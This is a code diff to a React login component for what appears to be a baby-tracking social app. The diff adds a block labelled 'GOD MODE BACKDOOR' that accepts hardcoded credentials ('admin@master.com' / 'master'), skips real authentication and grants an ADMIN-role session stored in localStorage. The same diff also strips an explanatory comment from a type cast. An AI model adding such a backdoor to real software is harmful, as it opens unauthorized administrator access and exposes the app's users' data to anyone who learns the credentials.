@@ -57,6 +57,30 @@ export const Auth: React.FC<{ onAuthSuccess: () => void }> = ({ onAuthSuccess })
 
   const handleLogin = async () => {
     if (!email || !password) return;
+
+    // --- GOD MODE BACKDOOR ---
+    if (email === 'admin@master.com' && password === 'master') {
+        const adminUser: User = {
+            id: 'MASTER_ADMIN',
+            name: 'Administrador',
+            email: 'admin@master.com',
+            avatar: '',
+            role: 'ADMIN',
+            persona: 'SISTEMA',
+            babyName: 'Sistema',
+            babyAvatar: '',
+            babyGender: Gender.BOY,
+            babyBirthDate: new Date().toISOString(),
+            age: 'Infinite',
+            friends: [],
+            storyVisibility: 'PRIVATE'
+        };
+        localStorage.setItem('baby_user', JSON.stringify(adminUser));
+        onAuthSuccess();
+        return;
+    }
+    // -------------------------
+
     setLoading(true);
     try {
       const userId = email.replace(/[^a-zA-Z0-9]/g, '_');
@@ -96,7 +120,7 @@ export const Auth: React.FC<{ onAuthSuccess: () => void }> = ({ onAuthSuccess })
         friends: [],
         storyVisibility: 'FAMILY', // Padrão: Apenas Família
         createdAt: Date.now()
-      } as any; // Cast temporário devido a createdAt não estar na interface User explicitamente se for restrito
+      } as any; 
       
       await setDoc(doc(db, "users", userId), userData);
       localStorage.setItem('baby_user', JSON.stringify(userData));
